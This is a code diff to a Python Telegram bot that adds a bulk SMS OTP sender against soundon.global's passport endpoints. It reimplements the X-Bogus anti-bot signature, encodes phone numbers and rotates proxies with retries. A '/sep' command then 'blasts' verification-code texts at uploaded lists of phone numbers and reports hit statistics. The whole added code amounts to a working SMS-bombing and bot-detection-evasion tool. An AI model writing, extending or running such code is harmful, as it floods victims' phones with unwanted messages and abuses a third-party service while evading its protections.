@@ -14,12 +14,14 @@ Features:
 """
 
 import asyncio
+import base64
 import hashlib
 import json
 import logging
 import os
 import random
 import string
+import struct
 import time
 import uuid
 import re
@@ -1954,6 +1956,215 @@ class SuperOTPSender:
 
 
 # ============================================
+# SoundOn (Mobile /sep) - Pure-Python X-Bogus OTP Sender
+# Endpoint: https://www.soundon.global/passport/web/send_code/
+# ============================================
+
+SOUNDON_CUSTOM_B64 = "Dkdpgh4ZKsQB80/Mfvw36XI1R25-WUAlEi7NLboqYTOPuzmFjJnryx9HVGcaStCe="
+SOUNDON_STD_B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
+SOUNDON_UA_KEY = bytes([0x00, 0x01, 0x0E])
+SOUNDON_PL_KEY = bytes([0xFF])
+SOUNDON_MAGIC = 0x4A41279F
+SOUNDON_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+    "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+)
+
+
+def _soundon_rc4(key: bytes, data: bytes) -> bytes:
+    S = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    out = bytearray()
+    i = j = 0
+    for b in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        out.append(b ^ S[(S[i] + S[j]) % 256])
+    return bytes(out)
+
+
+def _soundon_md5_hex(data) -> str:
+    if isinstance(data, str):
+        data = data.encode()
+    return hashlib.md5(data).hexdigest()
+
+
+def _soundon_double_md5(data) -> bytes:
+    return bytes.fromhex(_soundon_md5_hex(bytes.fromhex(_soundon_md5_hex(data))))
+
+
+def _soundon_ua_md5(ua: str) -> bytes:
+    enc = _soundon_rc4(SOUNDON_UA_KEY, ua.encode())
+    b64 = base64.b64encode(enc).decode("iso-8859-1")
+    return bytes.fromhex(_soundon_md5_hex(b64))
+
+
+def soundon_xbogus(query: str, body: str = "") -> str:
+    ts = int(time.time())
+    p = _soundon_double_md5(query)
+    b = _soundon_double_md5(body or "")
+    u = _soundon_ua_md5(SOUNDON_UA)
+    pl = (
+        bytearray([0x40])
+        + bytearray(SOUNDON_UA_KEY)
+        + bytearray(p[14:16])
+        + bytearray(b[14:16])
+        + bytearray(u[14:16])
+        + bytearray(struct.pack(">I", ts))
+        + bytearray(struct.pack(">I", SOUNDON_MAGIC))
+    )
+    xor_val = 0
+    for byte in pl:
+        xor_val ^= byte
+    pl.append(xor_val & 0xFF)
+    enc = _soundon_rc4(SOUNDON_PL_KEY, bytes(pl))
+    final = bytes([0x02, 0xFF]) + enc
+    std = base64.b64encode(final).decode("ascii")
+    return std.translate(str.maketrans(SOUNDON_STD_B64, SOUNDON_CUSTOM_B64))
+
+
+def _soundon_encode_phone(phone: str) -> str:
+    return "".join(f"{ord(c) ^ 5:02x}" for c in phone)
+
+
+class SoundOnOTPSender:
+    """Pure-Python X-Bogus signed SoundOn (TikTok-PK) SMS sender.
+
+    Used by the /sep (Mobile) bot command. Each instance maintains its own
+    requests.Session so it is safe to run in a thread pool worker.
+    """
+
+    REGION_URL = "https://www.soundon.global/passport/web/region/"
+    SEND_URL = "https://www.soundon.global/passport/web/send_code/"
+    REFERER = "https://www.soundon.global/login/login?lang=en&region=PK"
+
+    def __init__(self):
+        self.session = requests.Session()
+        self.session.headers["user-agent"] = SOUNDON_UA
+        self.csrf = ""
+        self.ms_token = ""
+
+    def _apply_proxy(self, proxy: Optional[str]):
+        if proxy:
+            self.session.proxies = {"http": proxy, "https": proxy}
+            self.session.verify = False
+        else:
+            self.session.proxies = {}
+            self.session.verify = True
+
+    def _refresh_tokens(self, proxy: Optional[str] = None):
+        self._apply_proxy(proxy)
+        params = {
+            "aid": "2960",
+            "account_sdk_source": "web",
+            "sdk_version": "2.1.10-tiktok",
+            "language": "en",
+        }
+        body = "hashed_id=init&type=1"
+        qs = urlencode(params)
+        params["X-Bogus"] = soundon_xbogus(qs, body)
+        self.session.post(
+            self.REGION_URL,
+            params=params,
+            data=body,
+            headers={
+                "content-type": "application/x-www-form-urlencoded",
+                "referer": self.REFERER,
+            },
+            timeout=30,
+        )
+        self.csrf = self.session.cookies.get("passport_csrf_token", "") or self.csrf
+        self.ms_token = self.session.cookies.get("msToken", "") or self.ms_token
+
+    def send_otp_sync(self, phone: str, proxy: Optional[str] = None) -> Dict:
+        start_time = time.time()
+        try:
+            if not self.csrf:
+                self._refresh_tokens(proxy)
+            self._apply_proxy(proxy)
+            encoded = _soundon_encode_phone(phone)
+            body = (
+                f"mix_mode=1&mobile={encoded}&type=3635&language=en&fixed_mix_mode=1"
+            )
+            params = {
+                "aid": "2960",
+                "account_sdk_source": "web",
+                "sdk_version": "2.1.10-tiktok",
+                "language": "en",
+                "verifyFp": f"verify_{int(time.time())}_{os.urandom(4).hex()}",
+            }
+            if self.ms_token:
+                params["msToken"] = self.ms_token
+            qs = urlencode(params)
+            params["X-Bogus"] = soundon_xbogus(qs, body)
+            r = self.session.post(
+                self.SEND_URL,
+                params=params,
+                data=body,
+                headers={
+                    "content-type": "application/x-www-form-urlencoded",
+                    "referer": self.REFERER,
+                    "x-tt-passport-csrf-token": self.csrf,
+                    "accept": "application/json, text/javascript",
+                },
+                timeout=30,
+            )
+            new_csrf = self.session.cookies.get("passport_csrf_token", "")
+            if new_csrf:
+                self.csrf = new_csrf
+            new_ms = self.session.cookies.get("msToken", "")
+            if new_ms:
+                self.ms_token = new_ms
+            elapsed = (time.time() - start_time) * 1000
+            try:
+                data = r.json()
+            except ValueError:
+                return {
+                    "success": False,
+                    "error": "Invalid JSON response",
+                    "raw": r.text[:200],
+                    "time_ms": elapsed,
+                    "phone": phone,
+                    "status_code": r.status_code,
+                    "proxy_used": proxy or "Direct",
+                }
+            success = data.get("message") == "success"
+            inner = data.get("data") if isinstance(data.get("data"), dict) else {}
+            return {
+                "success": success,
+                "data": inner,
+                "message": data.get("message"),
+                "raw": data,
+                "time_ms": elapsed,
+                "phone": phone,
+                "status_code": r.status_code,
+                "proxy_used": proxy or "Direct",
+            }
+        except requests.exceptions.RequestException as e:
+            elapsed = (time.time() - start_time) * 1000
+            return {
+                "success": False,
+                "error": str(e),
+                "time_ms": elapsed,
+                "phone": phone,
+                "proxy_used": proxy or "Direct",
+            }
+        except Exception as e:
+            elapsed = (time.time() - start_time) * 1000
+            return {
+                "success": False,
+                "error": f"{type(e).__name__}: {e}",
+                "time_ms": elapsed,
+                "phone": phone,
+                "proxy_used": proxy or "Direct",
+            }
+
+
+# ============================================
 # TASK MANAGEMENT
 # ============================================
 
@@ -2191,6 +2402,25 @@ async def send_super_otp_async(phone: str, proxies: List[str], semaphore: asynci
         return result
 
 
+async def send_soundon_otp_async(phone: str, proxies: List[str], semaphore: asyncio.Semaphore) -> Dict:
+    """Send SoundOn (Mobile /sep) OTP asynchronously using thread pool."""
+    async with semaphore:
+        loop = asyncio.get_event_loop()
+        proxy = random.choice(proxies) if proxies else None
+
+        sender = SoundOnOTPSender()
+        result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone, proxy)
+
+        # One retry on hard failure with a fresh proxy
+        if not result.get("success") and proxies:
+            retry_proxy = random.choice(proxies)
+            sender2 = SoundOnOTPSender()
+            result = await loop.run_in_executor(thread_pool, sender2.send_otp_sync, phone, retry_proxy)
+
+        await global_stats.increment(result.get("success", False))
+        return result
+
+
 # ============================================
 # COMMAND HANDLERS
 # ============================================
@@ -2223,6 +2453,10 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>ðŸ“¦ Bulk OTP:</b>
 /bulk - Start bulk task
+
+<b>ðŸ“² Mobile (SoundOn):</b>
+/sep - Bulk SoundOn SMS on saved numbers
+<code>/sep +9230xxxxxxxx</code> - Single SoundOn test
 
 <b>â° Schedule Task:</b>
 <code>/schedule 14:30</code> - Schedule at 2:30 PM
@@ -2764,6 +2998,34 @@ async def zijiesingle_command(update: Update, context: ContextTypes.DEFAULT_TYPE
             "Type 3536 - Afghanistan numbers supported!",
             parse_mode="HTML"
         )
+
+
+async def sep_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send Mobile (SoundOn) SMS via /sep using saved numbers + proxies.
+
+    Usage:
+      /sep                  -> bulk: uses saved /setnumbers + /setproxies
+      /sep +9230xxxxxxxx    -> single test send (proxy auto-picked from saved)
+      /sep +92xxxx ip:port  -> single test send with explicit proxy
+    """
+    user_id = update.effective_user.id
+
+    if context.args:
+        phone = ' '.join(context.args)
+        await process_single_soundon_otp(update, context, phone)
+        return
+
+    numbers = user_states[user_id].get('numbers', [])
+    if not numbers:
+        await update.message.reply_text(
+            "â„¹ï¸ <b>No numbers loaded!</b>\n\n"
+            "Use /setnumbers or /uploadnumbers first, then run /sep to start the Mobile (SoundOn) blast.",
+            parse_mode="HTML",
+        )
+        return
+
+    proxies = user_states[user_id].get('proxies', [])
+    await start_soundon_bulk_task(update, context, numbers, proxies)
 
 
 async def done_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3419,6 +3681,159 @@ Total Failed: {g_stats['total_failed']:,}
 
 
 # ============================================
+# Mobile (SoundOn /sep) bulk + single handlers
+# ============================================
+
+async def process_single_soundon_otp(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
+    """Process a single Mobile (SoundOn) OTP send for /sep <phone>."""
+    user_id = update.effective_user.id
+    proxies = user_states[user_id].get('proxies', [])
+
+    parts = phone.split()
+    phone_num = parts[0]
+    proxy = parts[1] if len(parts) > 1 else None
+
+    if not proxy and proxies:
+        proxy = random.choice(proxies)
+
+    loop = asyncio.get_event_loop()
+    sender = SoundOnOTPSender()
+    result = await loop.run_in_executor(thread_pool, sender.send_otp_sync, phone_num, proxy)
+
+    await global_stats.increment(result.get("success", False))
+
+    if result.get("success"):
+        data = result.get("data") or {}
+        status_detail = "OTP Sent (SoundOn / Mobile)"
+        ticket = data.get("mobile_ticket", "") if isinstance(data, dict) else ""
+        ticket_line = f"\nTicket: <code>{ticket[:24]}...</code>" if ticket else ""
+    else:
+        data = result.get("data") or {}
+        err_code = data.get("error_code") if isinstance(data, dict) else None
+        err_desc = (data.get("description") if isinstance(data, dict) else None) \
+            or result.get("error", "Unknown")
+        status_detail = f"Error {err_code}: {err_desc}" if err_code else str(err_desc)[:120]
+        ticket_line = ""
+
+    time_ms = result.get("time_ms", 0)
+
+    msg = f"""
+{'âœ…' if result.get('success') else 'âŒ'} <b>Mobile (SoundOn) OTP Result</b>
+
+Phone: <code>{phone_num}</code>
+Proxy: {(proxy or 'Direct')[:40]}
+Status: {status_detail}{ticket_line}
+Time: {time_ms:.2f}ms
+"""
+    await update.message.reply_text(msg, parse_mode="HTML")
+
+
+async def start_soundon_bulk_task(update: Update, context: ContextTypes.DEFAULT_TYPE,
+                                   numbers: List[str], proxies: List[str]):
+    """Start a Mobile (SoundOn) bulk OTP task on saved numbers + proxies."""
+    chat_id = str(update.effective_chat.id)
+    task_id = await task_manager.create_task(numbers, proxies, chat_id)
+    task = task_manager.get_task(task_id)
+    task.status = "running"
+    task.app_key = "soundon"
+    task_manager.running_tasks.add(task_id)
+
+    await update.message.reply_text(
+        f"<b>Mobile (SoundOn) Task #{task_id} Started!</b>\n\n"
+        f"Numbers: {len(numbers):,}\n"
+        f"Proxies: {len(proxies):,}\n"
+        f"Endpoint: soundon.global (aid=2960, type=3635)\n\n"
+        f"Use /cancel {task_id} to stop.",
+        parse_mode="HTML",
+    )
+
+    asyncio.create_task(run_soundon_bulk_task_concurrent(context, task))
+
+
+async def run_soundon_bulk_task_concurrent(context: ContextTypes.DEFAULT_TYPE, task: Task):
+    """Run Mobile (SoundOn) bulk task with rate limiting + progress logs."""
+    semaphore = asyncio.Semaphore(5)
+    batch_results: List[Dict] = []
+    last_log_count = 0
+
+    for batch_start in range(0, len(task.phone_numbers), BATCH_SIZE):
+        if task.cancelled:
+            break
+
+        batch_end = min(batch_start + BATCH_SIZE, len(task.phone_numbers))
+        batch = task.phone_numbers[batch_start:batch_end]
+
+        coros = [send_soundon_otp_async(phone, task.proxies, semaphore) for phone in batch]
+        results = await asyncio.gather(*coros, return_exceptions=True)
+
+        for result in results:
+            if isinstance(result, Exception):
+                task.fail_count += 1
+                batch_results.append({"success": False, "error": str(result)})
+            else:
+                if result.get("success"):
+                    task.success_count += 1
+                else:
+                    task.fail_count += 1
+                batch_results.append(result)
+            task.current_index += 1
+
+        if task.current_index - last_log_count >= LOG_INTERVAL:
+            last_log_count = task.current_index
+            elapsed = time.time() - task.start_time
+            speed = task.current_index / elapsed if elapsed > 0 else 0
+            recent_results = batch_results[-LOG_INTERVAL:]
+            recent_success = sum(1 for r in recent_results if r.get("success"))
+            recent_failed = len(recent_results) - recent_success
+            g_stats = global_stats.get_stats()
+            progress_msg = f"""
+<b>Mobile Task #{task.task_id} Progress</b>
+
+Progress: {task.current_index}/{len(task.phone_numbers)}
+Success: {task.success_count}
+Failed: {task.fail_count}
+
+Last {len(recent_results)} Requests:
+Success: {recent_success} | Failed: {recent_failed}
+
+Speed: {speed:.1f} req/s
+Elapsed: {elapsed:.1f}s
+
+Global Hits:
+Total: {g_stats['total_requests']:,}
+Success: {g_stats['total_success']:,}
+Failed: {g_stats['total_failed']:,}
+"""
+            await send_message_safe(context, task.chat_id, progress_msg, parse_mode="HTML")
+
+    task.status = "completed" if not task.cancelled else "cancelled"
+    task_manager.running_tasks.discard(task.task_id)
+
+    elapsed = time.time() - task.start_time
+    rate = (task.success_count / len(task.phone_numbers) * 100) if task.phone_numbers else 0
+    speed = len(task.phone_numbers) / elapsed if elapsed > 0 else 0
+    g_stats = global_stats.get_stats()
+
+    final_msg = f"""
+<b>Mobile Task #{task.task_id} Complete!</b>
+
+Total: {len(task.phone_numbers)}
+Success: {task.success_count}
+Failed: {task.fail_count}
+Success Rate: {rate:.1f}%
+
+Total Time: {elapsed:.1f}s
+Average Speed: {speed:.1f} req/s
+
+Global Hits:
+Total Requests: {g_stats['total_requests']:,}
+Total Success: {g_stats['total_success']:,}
+Total Failed: {g_stats['total_failed']:,}
+"""
+    await send_message_safe(context, task.chat_id, final_msg, parse_mode="HTML")
+
+
+# ============================================
 # MESSAGE & FILE HANDLERS
 # ============================================
 
@@ -3581,6 +3996,7 @@ def main():
     application.add_handler(CommandHandler("setapp2", setapp2_command))
     application.add_handler(CommandHandler("zijie", zijie_command))
     application.add_handler(CommandHandler("zijiesingle", zijiesingle_command))
+    application.add_handler(CommandHandler("sep", sep_command))
     application.add_handler(CommandHandler("done", done_command))
     
     # Callback handler
